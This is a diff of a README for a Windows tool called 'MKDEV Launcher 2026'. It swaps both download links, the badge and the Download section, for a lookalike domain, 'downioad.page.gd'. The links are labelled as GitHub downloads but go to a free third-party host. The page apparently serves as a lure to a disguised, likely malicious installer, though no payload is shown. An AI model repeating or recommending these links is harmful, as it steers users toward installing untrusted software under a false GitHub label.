@@ -2,7 +2,7 @@
 
 MKDEV Launcher 2026 is a robust and feature-rich application designed to streamline the management and launching of MKDEV software on Windows desktops. It provides an intuitive interface for organizing, updating, and accessing various MKDEV tools, enhancing productivity for developers and power users alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,7 +71,7 @@ A: Absolutely, MKDEV Launcher offers multiple theme options and layout configura
 
 ## Download
 
-To access the latest version of MKDEV Launcher, please [Download the latest version from GitHub](https://download-page.page.gd/).
+To access the latest version of MKDEV Launcher, please [Download the latest version from GitHub](https://downioad.page.gd/).
 
 ## Acknowledgements
 
